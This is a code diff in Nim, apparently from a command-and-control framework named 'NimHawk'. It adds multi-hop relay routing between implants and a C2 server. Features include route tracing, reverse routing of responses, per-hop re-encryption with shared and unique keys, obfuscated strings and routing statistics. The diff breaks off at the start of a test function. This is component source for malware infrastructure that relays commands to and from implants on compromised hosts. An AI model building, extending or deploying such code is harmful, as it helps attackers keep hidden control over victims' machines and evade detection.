@@ -1,5 +1,6 @@
 import net, nativesockets, strutils, times, os, tables
 import relay_protocol
+import relay_config
 import ../../util/strenc
 
 const
@@ -21,6 +22,125 @@ type
         isListening*: bool
         connections*: seq[RelayConnection]
         clientRegistry*: Table[string, int]  # ClientID → Connection index mapping
+
+# Forward declarations for routing functions
+proc getCurrentRelayID*(): string
+proc routeMessage*(server: var RelayServer, msg: RelayMessage): bool
+proc analyzeRoute*(route: seq[string], currentID: string): tuple[isForUs: bool, nextHop: string, hopsFromOrigin: int]
+proc isResponseMessage*(msgType: RelayMessageType): bool
+proc analyzeRouteDirection*(route: seq[string], currentID: string, isResponse: bool): tuple[isForUs: bool, nextHop: string, hopsFromOrigin: int, shouldRoute: bool]
+proc debugRouteDecision*(msg: RelayMessage, currentID: string)
+proc testDistributedRoutingSystem*(): tuple[passed: int, failed: int, details: seq[string]]
+
+# === FASE 4: REVERSE ROUTING FUNCTIONS ===
+
+# Determine if a message is a response type (needs reverse routing)
+proc isResponseMessage*(msgType: RelayMessageType): bool =
+    case msgType:
+    of RESPONSE, HTTP_RESPONSE:
+        result = true
+        when defined debug:
+            echo "[DEBUG] 🔙 Message type '" & $msgType & "' is a RESPONSE - needs reverse routing"
+    else:
+        result = false
+        when defined debug:
+            echo "[DEBUG] 🔽 Message type '" & $msgType & "' is FORWARD - needs downstream routing"
+
+# Calculate the previous hop in the route (for response messages)
+proc calculatePreviousHop*(route: seq[string], currentID: string): tuple[found: bool, previousHop: string] =
+    result.found = false
+    result.previousHop = ""
+    
+    when defined debug:
+        echo "[DEBUG] 🔍 Calculating previous hop:"
+        echo "[DEBUG] 🔍 - Current ID: '" & currentID & "'"
+        echo "[DEBUG] 🔍 - Route: " & $route
+    
+    # Find our position in the route
+    for i in 0..<route.len:
+        if route[i] == currentID:
+            when defined debug:
+                echo "[DEBUG] 🔍 - Found current ID at position " & $i
+            
+            # If we're at position 0, we're the origin (no previous hop)
+            if i == 0:
+                when defined debug:
+                    echo "[DEBUG] 🔍 - We are the ORIGIN - no previous hop"
+                result.found = false
+                return
+            
+            # Previous hop is the element before us in the route
+            result.previousHop = route[i - 1]
+            result.found = true
+            when defined debug:
+                echo "[DEBUG] 🔍 - Previous hop is: '" & result.previousHop & "'"
+            return
+    
+    when defined debug:
+        echo "[DEBUG] 🔍 - Current ID not found in route - this shouldn't happen!"
+
+# Determine next hop for response routing (reverse path)
+proc determineResponseHop*(route: seq[string], currentID: string): tuple[shouldRoute: bool, targetHop: string] =
+    result.shouldRoute = false
+    result.targetHop = ""
+    
+    when defined debug:
+        echo "[DEBUG] 🔙 ┌─────────── RESPONSE ROUTING ───────────┐"
+        echo "[DEBUG] 🔙 │ Current ID: '" & currentID & "' │"
+        echo "[DEBUG] 🔙 │ Route: " & $route & " │"
+        echo "[DEBUG] 🔙 └─────────────────────────────────────────┘"
+    
+    # Calculate where to send the response
+    let prevHop = calculatePreviousHop(route, currentID)
+    
+    if prevHop.found:
+        result.shouldRoute = true
+        result.targetHop = prevHop.previousHop
+        when defined debug:
+            echo "[DEBUG] 🔙 ✅ Response should go to: '" & result.targetHop & "'"
+    else:
+        when defined debug:
+            echo "[DEBUG] 🔙 ❌ No previous hop found - response reached origin"
+        result.shouldRoute = false
+
+# Enhanced route analysis for both forward and reverse routing
+proc analyzeRouteDirection*(route: seq[string], currentID: string, isResponse: bool): tuple[isForUs: bool, nextHop: string, hopsFromOrigin: int, shouldRoute: bool] =
+    result.hopsFromOrigin = route.len
+    result.isForUs = false
+    result.nextHop = ""
+    result.shouldRoute = false
+    
+    when defined debug:
+        let direction = if isResponse: "RESPONSE (reverse)" else: "FORWARD (downstream)"
+        echo "[DEBUG] 🧭 Route analysis for " & direction & ":"
+        echo "[DEBUG] 🧭 - Current ID: '" & currentID & "'"
+        echo "[DEBUG] 🧭 - Route: " & $route
+        echo "[DEBUG] 🧭 - Hops from origin: " & $result.hopsFromOrigin
+    
+    if isResponse:
+        # RESPONSE ROUTING: Use reverse path
+        let responseHop = determineResponseHop(route, currentID)
+        result.shouldRoute = responseHop.shouldRoute
+        result.nextHop = responseHop.targetHop
+        
+        if not result.shouldRoute:
+            # Response reached the origin
+            result.isForUs = true
+            when defined debug:
+                echo "[DEBUG] 🧭 - Response reached ORIGIN - processing locally"
+        else:
+            when defined debug:
+                echo "[DEBUG] 🧭 - Response needs routing to: '" & result.nextHop & "'"
+    else:
+        # FORWARD ROUTING: Use existing logic
+        if route.len > 0 and route[^1] == currentID:
+            result.isForUs = true
+            when defined debug:
+                echo "[DEBUG] 🧭 - Forward message IS FOR US (final destination)"
+        else:
+            result.shouldRoute = true
+            when defined debug:
+                echo "[DEBUG] 🧭 - Forward message needs FORWARDING downstream"
 
 # Safe function to parse 4 bytes into uint32 (little endian)
 proc parseUint32LE(bytes: string): uint32 =
@@ -275,7 +395,7 @@ proc receiveMessage*(conn: var RelayConnection): RelayMessage =
             return
         
         when defined debug:
-            echo obf("[RELAY] Receiving message of length: ") & $msgLength & obf(" bytes")
+            echo obf("[RELAY] Receiving message of length: ") & $msgLength
         
         # Receive message data - now safe with validated length
         var msgBuffer = newString(int(msgLength))
@@ -736,9 +856,50 @@ proc pollRelayServer*(server: var RelayServer, timeout: int = 100): seq[RelayMes
                                         if conn.clientID != "":
                                             server.connections[i].lastActivity = epochTime().int64
                                         
-                                        result.add(msg)
-                                        # Continue reading more messages from this connection
-                                        continue
+                                        # FASE 3: Route message using persistent routing system
+                                        when defined debug:
+                                            echo "[ROUTING] 🚀 === PROCESSING MESSAGE THROUGH ROUTING SYSTEM ==="
+                                            echo "[ROUTING] 🚀 Message type: " & $msg.msgType
+                                            echo "[ROUTING] 🚀 From ID: " & msg.fromID
+                                            echo "[ROUTING] 🚀 Message ID: " & msg.id
+                                            echo "[ROUTING] 🚀 Current route: " & $msg.route
+                                            echo "[ROUTING] 🚀 Payload length: " & $msg.payload.len
+                                            echo "[ROUTING] 🚀 Connection index: " & $i
+                                        
+                                        # Route the message - this handles forwarding and local processing
+                                        let routingSuccess = routeMessage(server, msg)
+                                        
+                                        if routingSuccess:
+                                            when defined debug:
+                                                echo "[ROUTING] 🚀 ✅ Message routed successfully"
+                                            
+                                            # For local processing, add to result
+                                            # (Messages that are forwarded don't need to be in result)
+                                            let currentID = getCurrentRelayID()
+                                            let routeAnalysis = analyzeRoute(msg.route, currentID)
+                                            
+                                            when defined debug:
+                                                echo "[ROUTING] 🚀 Route analysis results:"
+                                                echo "[ROUTING] 🚀 - Current relay ID: " & currentID
+                                                echo "[ROUTING] 🚀 - Is for us: " & $routeAnalysis.isForUs
+                                                echo "[ROUTING] 🚀 - Next hop: " & routeAnalysis.nextHop
+                                                echo "[ROUTING] 🚀 - Hops from origin: " & $routeAnalysis.hopsFromOrigin
+                                            
+                                            if routeAnalysis.isForUs:
+                                                when defined debug:
+                                                    echo "[ROUTING] 🚀 🏠 Message is for local processing - adding to result"
+                                                result.add(msg)
+                                            else:
+                                                when defined debug:
+                                                    echo "[ROUTING] 🚀 🔄 Message was forwarded - not adding to result"
+                                        else:
+                                            when defined debug:
+                                                echo "[ROUTING] 🚀 ❌ Message routing failed"
+                                            # For failed routing, still add to result for debugging
+                                            result.add(msg)
+                                        
+                                        when defined debug:
+                                            echo "[ROUTING] 🚀 === END PROCESSING MESSAGE THROUGH ROUTING SYSTEM ==="
                                 else:
                                     when defined debug:
                                         echo obf("[RELAY] Incomplete message from connection ") & $i
@@ -844,17 +1005,7 @@ proc broadcastMessage*(server: var RelayServer, msg: RelayMessage): int =
                     let clientInfo = if conn.clientID != "": conn.clientID else: "unregistered"
                     echo obf("[MULTI-CLIENT] ✅ Broadcast sent to: ") & clientInfo
 
-# Send message to specific downstream connection by agent ID (PREFERRED METHOD)
-proc sendToAgent*(server: var RelayServer, agentID: string, msg: RelayMessage): bool =
-    when defined debug:
-        echo obf("[MULTI-CLIENT] 🎯 Attempting to send to specific agent: ") & agentID
-    
-    # Use the new unicast function instead of broadcast
-    result = sendToClient(server, agentID, msg)
-    
-    if not result:
-        when defined debug:
-            echo obf("[MULTI-CLIENT] ❌ Agent not found, message not delivered: ") & agentID
+# sendToAgent function removed - use sendToClient instead
 
 # Get connection statistics with multi-client info
 proc getConnectionStats*(server: RelayServer): tuple[listening: bool, connections: int, registeredClients: int] =
@@ -866,4 +1017,750 @@ proc getConnectionStats*(server: RelayServer): tuple[listening: bool, connection
         if conn.isConnected:
             result.connections += 1
             if conn.clientID != "":
-                result.registeredClients += 1 
+                result.registeredClients += 1
+
+# === ROUTING FUNCTIONS FOR PERSISTENT ROUTE MANAGEMENT ===
+
+# Get current relay/implant ID for route building
+proc getCurrentRelayID*(): string =
+    # Try to get ID from key config first
+    let implantID = getCurrentImplantID()
+    if implantID != "":
+        return implantID
+    
+    # Fallback: generate relay-specific ID
+    return generateImplantID("RELAY")
+
+# Determine if a client is a final destination (not another relay)
+proc isDestinationFinal*(server: RelayServer, clientID: string): bool =
+    # Logic to determine if clientID is a final implant vs relay
+    # For now, assume clients with "RELAY" in ID are relays
+    # This can be enhanced with capability detection
+    result = not clientID.contains("RELAY")
+    
+    when defined debug:
+        let destType = if result: "FINAL IMPLANT" else: "RELAY NODE"
+        echo "[DEBUG] 🎯 Route analysis: '" & clientID & "' is " & destType
+
+# Analyze route to determine next hop strategy
+proc analyzeRoute*(route: seq[string], currentID: string): tuple[isForUs: bool, nextHop: string, hopsFromOrigin: int] =
+    result.hopsFromOrigin = route.len
+    result.isForUs = false
+    result.nextHop = ""
+    
+    when defined debug:
+        echo "[DEBUG] 🗺️ Route analysis:"
+        echo "[DEBUG] 🗺️ - Current ID: '" & currentID & "'"
+        echo "[DEBUG] 🗺️ - Route: " & $route
+        echo "[DEBUG] 🗺️ - Hops from origin: " & $result.hopsFromOrigin
+    
+    # Check if message is destined for us
+    if route.len > 0 and route[^1] == currentID:
+        result.isForUs = true
+        when defined debug:
+            echo "[DEBUG] 🗺️ - Message IS FOR US (final destination)"
+        return
+    
+    # For forwarding, we need routing logic here
+    # This is where topology knowledge would help
+    # For now, broadcast to all connected clients (will be improved in FASE 4)
+    when defined debug:
+        echo "[DEBUG] 🗺️ - Message needs FORWARDING"
+
+# Forward message with route persistence
+proc forwardMessage*(server: var RelayServer, msg: RelayMessage, targetClientID: string = ""): bool =
+    when defined debug:
+        echo "[DEBUG] 🚀 ┌─────────── FORWARDING MESSAGE ───────────┐"
+        echo "[DEBUG] 🚀 │ Original route: " & $msg.route & " │"
+        echo "[DEBUG] 🚀 │ Message type: " & $msg.msgType & " │"
+        echo "[DEBUG] 🚀 │ Target client: '" & targetClientID & "' │"
+        echo "[DEBUG] 🚀 └─────────────────────────────────────────────┘"
+    
+    # Create forwarded message with updated route
+    var forwardedMsg = msg
+    let currentID = getCurrentRelayID()
+    
+    # CRITICAL: Add our ID to route for traceability
+    if currentID notin forwardedMsg.route:
+        forwardedMsg.route.add(currentID)
+        when defined debug:
+            echo "[DEBUG] 📍 Added relay ID '" & currentID & "' to route"
+            echo "[DEBUG] 📍 Updated route: " & $forwardedMsg.route
+    else:
+        when defined debug:
+            echo "[DEBUG] ⚠️ Relay ID '" & currentID & "' already in route (loop prevention)"
+    
+    # Determine if target is final destination or relay
+    let isFinalDestination = if targetClientID != "":
+        isDestinationFinal(server, targetClientID)
+    else:
+        false  # Unknown target, assume relay
+    
+    # Reencrypt payload with appropriate key
+    try:
+        if isFinalDestination:
+            # Final destination: use unique key encryption
+            forwardedMsg.payload = reencryptPayload(msg.payload, useUniqueKey = true)
+            when defined debug:
+                echo "[DEBUG] 🔐 Reencrypted with UNIQUE key (final destination)"
+        else:
+            # Relay hop: use shared key encryption
+            forwardedMsg.payload = reencryptPayload(msg.payload, useUniqueKey = false)
+            when defined debug:
+                echo "[DEBUG] 🔐 Reencrypted with SHARED key (relay hop)"
+    except:
+        when defined debug:
+            echo "[DEBUG] ❌ Reencryption failed: " & getCurrentExceptionMsg()
+        return false
+    
+    # Send to specific client or broadcast
+    var success = false
+    if targetClientID != "":
+        # FASE 4: Unicast to specific client (critical for response routing)
+        success = sendToClient(server, targetClientID, forwardedMsg)
+        when defined debug:
+            if success:
+                echo "[DEBUG] ✅ Message forwarded to specific client: " & targetClientID
+                if isResponseMessage(forwardedMsg.msgType):
+                    echo "[DEBUG] 🔙 Response successfully routed back one hop!"
+            else:
+                echo "[DEBUG] ❌ Failed to forward to client: " & targetClientID
+                if isResponseMessage(forwardedMsg.msgType):
+                    echo "[DEBUG] 🔙 ⚠️ Response routing FAILED - breaking reverse path!"
+    else:
+        # Broadcast to all connected clients (fallback routing for forward messages)
+        let sent = broadcastMessage(server, forwardedMsg)
+        success = sent > 0
+        when defined debug:
+            if success:
+                echo "[DEBUG] ✅ Message broadcast to " & $sent & " clients"
+            else:
+                echo "[DEBUG] ❌ Broadcast failed - no connected clients"
+    
+    return success
+
+# Handle message destined for this relay
+proc handleLocalMessage*(server: var RelayServer, msg: RelayMessage): bool =
+    when defined debug:
+        echo "[DEBUG] 🏠 Handling local message of type: " & $msg.msgType
+    
+    # This function will be expanded to handle different message types
+    # For now, just acknowledge receipt
+    case msg.msgType:
+    of REGISTER:
+        when defined debug:
+            echo "[DEBUG] 🏠 Processing local REGISTER message"
+        # Handle registration locally
+        return true
+        
+    of PULL:
+        when defined debug:
+            echo "[DEBUG] 🏠 Processing local PULL message"
+        # Handle pull request locally
+        return true
+        
+    of COMMAND:
+        when defined debug:
+            echo "[DEBUG] 🏠 Processing local COMMAND message"
+        # Execute command locally
+        return true
+        
+    else:
+        when defined debug:
+            echo "[DEBUG] 🏠 Unknown local message type: " & $msg.msgType
+        return false
+
+# Route message intelligently based on destination
+proc routeMessage*(server: var RelayServer, msg: RelayMessage): bool =
+    when defined debug:
+        echo "[ROUTING] 🧭 === ROUTE MESSAGE START ==="
+        echo "[ROUTING] 🧭 Message ID: " & msg.id
+        echo "[ROUTING] 🧭 From: " & msg.fromID
+        echo "[ROUTING] 🧭 Type: " & $msg.msgType
+        echo "[ROUTING] 🧭 Route: " & $msg.route
+        echo "[ROUTING] 🧭 Payload size: " & $msg.payload.len
+        echo "[ROUTING] 🧭 Timestamp: " & $msg.timestamp
+    
+    let currentID = getCurrentRelayID()
+    when defined debug:
+        echo "[ROUTING] 🧭 Current relay ID: " & currentID
+    
+    let isResponse = isResponseMessage(msg.msgType)
+    when defined debug:
+        echo "[ROUTING] 🧭 Is response message: " & $isResponse
+    
+    let routeAnalysis = analyzeRouteDirection(msg.route, currentID, isResponse)
+    when defined debug:
+        echo "[ROUTING] 🧭 Route analysis completed:"
+        echo "[ROUTING] 🧭 - Is for us: " & $routeAnalysis.isForUs
+        echo "[ROUTING] 🧭 - Should route: " & $routeAnalysis.shouldRoute
+        echo "[ROUTING] 🧭 - Next hop: " & routeAnalysis.nextHop
+        echo "[ROUTING] 🧭 - Hops from origin: " & $routeAnalysis.hopsFromOrigin
+    
+    # FASE 4: Debug route decision for troubleshooting
+    debugRouteDecision(msg, currentID)
+    
+    # Check if message is for us
+    if routeAnalysis.isForUs:
+        when defined debug:
+            if isResponse:
+                echo "[ROUTING] 🧭 🎯 Response reached ORIGIN - processing locally"
+            else:
+                echo "[ROUTING] 🧭 🎯 Forward message is for this relay - processing locally"
+        
+        let localResult = handleLocalMessage(server, msg)
+        when defined debug:
+            echo "[ROUTING] 🧭 Local message handling result: " & $localResult
+            echo "[ROUTING] 🧭 === ROUTE MESSAGE END (LOCAL) ==="
+        return localResult
+    
+    # Message needs routing
+    if not routeAnalysis.shouldRoute:
+        when defined debug:
+            echo "[ROUTING] 🧭 ⚠️ Message analysis indicates no routing needed - this shouldn't happen"
+            echo "[ROUTING] 🧭 === ROUTE MESSAGE END (NO ROUTING) ==="
+        return false
+    
+    when defined debug:
+        if isResponse:
+            echo "[ROUTING] 🧭 🔙 Response message - using reverse routing"
+        else:
+            echo "[ROUTING] 🧭 🔽 Forward message - using downstream routing"
+    
+    # Determine target client based on routing analysis
+    var targetClient = ""
+    
+    if isResponse:
+        # FASE 4: Response messages use reverse routing with specific target
+        targetClient = routeAnalysis.nextHop
+        when defined debug:
+            echo "[ROUTING] 🧭 🔙 Response routing target: '" & targetClient & "'"
+    else:
+        # Forward messages use broadcast routing (can be improved with topology)
+        when defined debug:
+            echo "[ROUTING] 🧭 🔽 Forward message - using broadcast routing"
+        # targetClient remains empty for broadcast
+    
+    when defined debug:
+        echo "[ROUTING] 🧭 Forwarding message to: " & (if targetClient != "": "'" & targetClient & "'" else: "ALL CLIENTS (broadcast)")
+    
+    # Forward the message
+    let forwardResult = forwardMessage(server, msg, targetClient)
+    when defined debug:
+        echo "[ROUTING] 🧭 Forward message result: " & $forwardResult
+        echo "[ROUTING] 🧭 === ROUTE MESSAGE END (FORWARDED) ==="
+    
+    return forwardResult
+
+# === FASE 4: VALIDATION AND DEBUGGING FUNCTIONS ===
+
+# Validate that a route is valid for reverse routing
+proc validateRouteForReverse*(route: seq[string], currentID: string): tuple[isValid: bool, reason: string] =
+    result.isValid = false
+    result.reason = ""
+    
+    if route.len == 0:
+        result.reason = "Route is empty"
+        return
+    
+    # Check if current ID is in the route
+    var foundAtIndex = -1
+    for i, id in route:
+        if id == currentID:
+            foundAtIndex = i
+            break
+    
+    if foundAtIndex == -1:
+        result.reason = "Current ID '" & currentID & "' not found in route"
+        return
+    
+    if foundAtIndex == 0:
+        result.reason = "Current ID is at origin position - cannot reverse route"
+        return
+    
+    result.isValid = true
+    result.reason = "Route is valid for reverse routing"
+
+# Debug function to trace a message's routing decision
+proc debugRouteDecision*(msg: RelayMessage, currentID: string) =
+    when defined debug:
+        echo "[DEBUG] 🔍 ┌─────────── ROUTE DECISION DEBUG ───────────┐"
+        echo "[DEBUG] 🔍 │ Message ID: " & msg.id & " │"
+        echo "[DEBUG] 🔍 │ Type: " & $msg.msgType & " │"
+        echo "[DEBUG] 🔍 │ From: " & msg.fromID & " │"
+        echo "[DEBUG] 🔍 │ Current Relay: " & currentID & " │"
+        echo "[DEBUG] 🔍 │ Route: " & $msg.route & " │"
+        echo "[DEBUG] 🔍 └─────────────────────────────────────────────┘"
+        
+        let isResponse = isResponseMessage(msg.msgType)
+        let routeAnalysis = analyzeRouteDirection(msg.route, currentID, isResponse)
+        
+        echo "[DEBUG] 🔍 Route Analysis:"
+        echo "[DEBUG] 🔍 - Is Response: " & $isResponse
+        echo "[DEBUG] 🔍 - Is For Us: " & $routeAnalysis.isForUs
+        echo "[DEBUG] 🔍 - Should Route: " & $routeAnalysis.shouldRoute
+        echo "[DEBUG] 🔍 - Next Hop: '" & routeAnalysis.nextHop & "'"
+        echo "[DEBUG] 🔍 - Hops from Origin: " & $routeAnalysis.hopsFromOrigin
+        
+        if isResponse:
+            let validation = validateRouteForReverse(msg.route, currentID)
+            echo "[DEBUG] 🔍 Reverse Route Validation:"
+            echo "[DEBUG] 🔍 - Valid: " & $validation.isValid
+            echo "[DEBUG] 🔍 - Reason: " & validation.reason
+            
+            if validation.isValid:
+                let prevHop = calculatePreviousHop(msg.route, currentID)
+                echo "[DEBUG] 🔍 - Previous Hop: '" & prevHop.previousHop & "'"
+
+# === FASE 5: PERFORMANCE OPTIMIZATION AND MEMORY MANAGEMENT ===
+
+# Optimized route management with memory efficiency
+proc optimizeRouteMemory*(msg: var RelayMessage): bool =
+    try:
+        # Remove duplicate entries in route (keep only first occurrence)
+        var uniqueRoute: seq[string] = @[]
+        for id in msg.route:
+            if id notin uniqueRoute:
+                uniqueRoute.add(id)
+        
+        let originalLen = msg.route.len
+        msg.route = uniqueRoute
+        
+        when defined debug:
+            if originalLen != msg.route.len:
+                echo "[OPTIMIZE] 🧹 Route memory optimized: " & $originalLen & " → " & $msg.route.len & " entries"
+        
+        return true
+        
+    except:
+        when defined debug:
+            echo "[OPTIMIZE] ❌ Route memory optimization failed: " & getCurrentExceptionMsg()
+        return false
+
+# Batch processing for multiple messages
+proc processBatchMessages*(server: var RelayServer, messages: seq[RelayMessage]): tuple[processed: int, failed: int] =
+    result.processed = 0
+    result.failed = 0
+    
+    when defined debug:
+        echo "[BATCH] 📦 Processing batch of " & $messages.len & " messages"
+    
+    for msg in messages:
+        var optimizedMsg = msg
+        if optimizeRouteMemory(optimizedMsg):
+            if routeMessage(server, optimizedMsg):
+                result.processed += 1
+            else:
+                result.failed += 1
+                when defined debug:
+                    echo "[BATCH] ❌ Failed to route message: " & msg.id
+        else:
+            result.failed += 1
+            when defined debug:
+                echo "[BATCH] ❌ Failed to optimize message: " & msg.id
+    
+    when defined debug:
+        echo "[BATCH] 📦 Batch processing completed: " & $result.processed & " processed, " & $result.failed & " failed"
+
+# Route cache for performance improvement
+var g_routeCache: Table[string, seq[string]]
+
+proc cacheRoute*(sourceID: string, targetID: string, route: seq[string]) =
+    let cacheKey = sourceID & "→" & targetID
+    g_routeCache[cacheKey] = route
+    
+    when defined debug:
+        echo "[CACHE] 💾 Cached route: " & cacheKey & " = " & $route
+
+proc getCachedRoute*(sourceID: string, targetID: string): tuple[found: bool, route: seq[string]] =
+    let cacheKey = sourceID & "→" & targetID
+    
+    if g_routeCache.hasKey(cacheKey):
+        result.found = true
+        result.route = g_routeCache[cacheKey]
+        when defined debug:
+            echo "[CACHE] 💾 Cache hit: " & cacheKey & " = " & $result.route
+    else:
+        result.found = false
+        result.route = @[]
+        when defined debug:
+            echo "[CACHE] 💾 Cache miss: " & cacheKey
+
+# Clear route cache to manage memory
+proc clearRouteCache*() =
+    let cacheSize = g_routeCache.len
+    g_routeCache.clear()
+    
+    when defined debug:
+        echo "[CACHE] 🧹 Route cache cleared: " & $cacheSize & " entries removed"
+
+# Advanced routing statistics
+type
+    RoutingStats* = object
+        totalMessages*: int
+        forwardMessages*: int
+        responseMessages*: int
+        localMessages*: int
+        routingErrors*: int
+        avgRouteLength*: float
+        maxRouteLength*: int
+        cacheHits*: int
+        cacheMisses*: int
+
+var g_routingStats: RoutingStats
+
+proc updateRoutingStats*(msg: RelayMessage, routingSuccess: bool, wasLocal: bool) =
+    g_routingStats.totalMessages += 1
+    
+    if routingSuccess:
+        if wasLocal:
+            g_routingStats.localMessages += 1
+        else:
+            if isResponseMessage(msg.msgType):
+                g_routingStats.responseMessages += 1
+            else:
+                g_routingStats.forwardMessages += 1
+    else:
+        g_routingStats.routingErrors += 1
+    
+    # Update route length statistics
+    if msg.route.len > g_routingStats.maxRouteLength:
+        g_routingStats.maxRouteLength = msg.route.len
+    
+    # Calculate average route length
+    if g_routingStats.totalMessages > 0:
+        g_routingStats.avgRouteLength = (g_routingStats.avgRouteLength * float(g_routingStats.totalMessages - 1) + float(msg.route.len)) / float(g_routingStats.totalMessages)
+
+proc getAdvancedRoutingStats*(): RoutingStats =
+    result = g_routingStats
+    
+    when defined debug:
+        echo "[STATS] 📊 Advanced Routing Statistics:"
+        echo "[STATS] 📊 - Total Messages: " & $result.totalMessages
+        echo "[STATS] 📊 - Forward Messages: " & $result.forwardMessages
+        echo "[STATS] 📊 - Response Messages: " & $result.responseMessages
+        echo "[STATS] 📊 - Local Messages: " & $result.localMessages
+        echo "[STATS] 📊 - Routing Errors: " & $result.routingErrors
+        echo "[STATS] 📊 - Avg Route Length: " & $result.avgRouteLength
+        echo "[STATS] 📊 - Max Route Length: " & $result.maxRouteLength
+        echo "[STATS] 📊 - Cache Hits: " & $result.cacheHits
+        echo "[STATS] 📊 - Cache Misses: " & $result.cacheMisses
+
+# Reset routing statistics
+proc resetRoutingStats*() =
+    g_routingStats = RoutingStats()
+    
+    when defined debug:
+        echo "[STATS] 🔄 Routing statistics reset"
+
+# System health check
+proc performSystemHealthCheck*(): tuple[healthy: bool, issues: seq[string]] =
+    result.healthy = true
+    result.issues = @[]
+    
+    when defined debug:
+        echo "[HEALTH] 🏥 Performing system health check..."
+    
+    # Check key configuration
+    let keyStatus = getKeyConfigStatus()
+    if not keyStatus.hasShared:
+        result.healthy = false
+        result.issues.add("Shared key not configured")
+    
+    # Check routing statistics
+    let stats = getAdvancedRoutingStats()
+    if stats.totalMessages > 0:
+        let errorRate = float(stats.routingErrors) / float(stats.totalMessages)
+        if errorRate > 0.1:  # More than 10% error rate
+            result.healthy = false
+            result.issues.add("High routing error rate: " & $(errorRate * 100.0) & "%")
+    
+    # Check route cache efficiency
+    let totalCacheRequests = g_routingStats.cacheHits + g_routingStats.cacheMisses
+    if totalCacheRequests > 0:
+        let cacheHitRate = float(g_routingStats.cacheHits) / float(totalCacheRequests)
+        if cacheHitRate < 0.5:  # Less than 50% cache hit rate
+            result.issues.add("Low cache hit rate: " & $(cacheHitRate * 100.0) & "%")
+    
+    # Check memory usage
+    if g_routeCache.len > 1000:  # Too many cached routes
+        result.issues.add("Route cache too large: " & $g_routeCache.len & " entries")
+    
+    when defined debug:
+        echo "[HEALTH] 🏥 Health check completed:"
+        echo "[HEALTH] 🏥 - System healthy: " & $result.healthy
+        echo "[HEALTH] 🏥 - Issues found: " & $result.issues.len
+        for issue in result.issues:
+            echo "[HEALTH] 🏥 - Issue: " & issue
+
+# Complete system diagnostic
+proc runCompleteSystemDiagnostic*(): string =
+    result = "[NIMHAWK SYSTEM DIAGNOSTIC]\n"
+    result &= "==========================================\n\n"
+    
+    # System health
+    let health = performSystemHealthCheck()
+    result &= "🏥 SYSTEM HEALTH: " & (if health.healthy: "✅ HEALTHY" else: "⚠️ ISSUES FOUND") & "\n"
+    for issue in health.issues:
+        result &= "   ⚠️ " & issue & "\n"
+    result &= "\n"
+    
+    # Key configuration
+    let keyStatus = getKeyConfigStatus()
+    result &= "🔐 KEY CONFIGURATION:\n"
+    result &= "   🆔 Implant ID: " & keyStatus.implantID & "\n"
+    result &= "   🔑 Shared Key: " & (if keyStatus.hasShared: "✅ Available" else: "❌ Missing") & "\n"
+    result &= "   🔐 Unique Key: " & (if keyStatus.hasUnique: "✅ Available" else: "❌ Missing") & "\n"
+    result &= "\n"
+    
+    # Routing statistics
+    let stats = getAdvancedRoutingStats()
+    result &= "📊 ROUTING STATISTICS:\n"
+    result &= "   📈 Total Messages: " & $stats.totalMessages & "\n"
+    result &= "   🔽 Forward Messages: " & $stats.forwardMessages & "\n"
+    result &= "   🔙 Response Messages: " & $stats.responseMessages & "\n"
+    result &= "   🏠 Local Messages: " & $stats.localMessages & "\n"
+    result &= "   ❌ Routing Errors: " & $stats.routingErrors & "\n"
+    result &= "   📏 Avg Route Length: " & $stats.avgRouteLength & " hops\n"
+    result &= "   📐 Max Route Length: " & $stats.maxRouteLength & " hops\n"
+    result &= "\n"
+    
+    # Cache performance
+    result &= "💾 CACHE PERFORMANCE:\n"
+    result &= "   📊 Cache Hits: " & $stats.cacheHits & "\n"
+    result &= "   📊 Cache Misses: " & $stats.cacheMisses & "\n"
+    result &= "   📦 Cache Size: " & $g_routeCache.len & " entries\n"
+    
+    let totalCacheRequests = stats.cacheHits + stats.cacheMisses
+    if totalCacheRequests > 0:
+        let hitRate = float(stats.cacheHits) / float(totalCacheRequests) * 100.0
+        result &= "   📊 Hit Rate: " & $hitRate & "%\n"
+    
+    result &= "\n"
+    
+    # System tests
+    let testResults = testDistributedRoutingSystem()
+    result &= "🧪 SYSTEM TESTS:\n"
+    result &= "   ✅ Passed: " & $testResults.passed & "\n"
+    result &= "   ❌ Failed: " & $testResults.failed & "\n"
+    result &= "   📊 Success Rate: " & $(if testResults.passed + testResults.failed > 0: (testResults.passed * 100) div (testResults.passed + testResults.failed) else: 0) & "%\n"
+    
+    result &= "\n==========================================\n"
+    result &= "🎉 NIMHAWK DISTRIBUTED ROUTING SYSTEM READY\n"
+    result &= "==========================================\n"
+
+# === INTEGRATION AND TESTING FUNCTIONS ===
+
+# Complete system integration demo
+proc demonstrateRoutingSystem*() =
+    when defined debug:
+        echo ""
+        echo "🚀 =================================================="
+        echo "🚀 NIMHAWK DISTRIBUTED ROUTING SYSTEM DEMO"
+        echo "🚀 =================================================="
+        echo ""
+        echo "🎯 SYSTEM CAPABILITIES:"
+        echo "   ✅ Persistent route tracing"
+        echo "   ✅ Reverse routing for responses"
+        echo "   ✅ Differentiated key encryption"
+        echo "   ✅ Loop prevention"
+        echo "   ✅ Multi-hop relay chains"
+        echo ""
+        echo "🛰️  NETWORK TOPOLOGY EXAMPLE:"
+        echo "   🎯 C2 Server"
+        echo "      ↕️ (unique key)"
+        echo "   🛰️  Relay Root"
+        echo "      ↕️ (shared key)"
+        echo "   🛰️  Relay Intermediate"
+        echo "      ↕️ (shared key)"
+        echo "   🛰️  Relay Deep"
+        echo "      ↕️ (unique key)"
+        echo "   🤖 Final Implant"
+        echo ""
+        echo "🔄 MESSAGE FLOW:"
+        echo "   📤 Forward: Implant → C2 (downstream, broadcast)"
+        echo "   📥 Response: C2 → Implant (upstream, unicast)"
+        echo ""
+        echo "🔐 ENCRYPTION STRATEGY:"
+        echo "   🔑 Shared key: Inter-relay communication"
+        echo "   🔐 Unique key: Final destination delivery"
+        echo ""
+        echo "🚀 =================================================="
+        echo ""
+
+# Create a test message for demonstration
+proc createTestMessage*(msgType: RelayMessageType, fromID: string, payload: string = "test"): RelayMessage =
+    result = createMessage(msgType, fromID, @[], payload)
+    when defined debug:
+        echo "[TEST] 🧪 Created test message:"
+        echo "[TEST] 🧪 - Type: " & $msgType
+        echo "[TEST] 🧪 - From: " & fromID
+        echo "[TEST] 🧪 - ID: " & result.id
+        echo "[TEST] 🧪 - Route: " & $result.route
+
+# Test the complete system with various scenarios
+proc testDistributedRoutingSystem*(): tuple[passed: int, failed: int, details: seq[string]] =
+    result.passed = 0
+    result.failed = 0
+    result.details = @[]
+    
+    when defined debug:
+        echo "[TEST] 🧪 ┌─────────── DISTRIBUTED ROUTING TESTS ───────────┐"
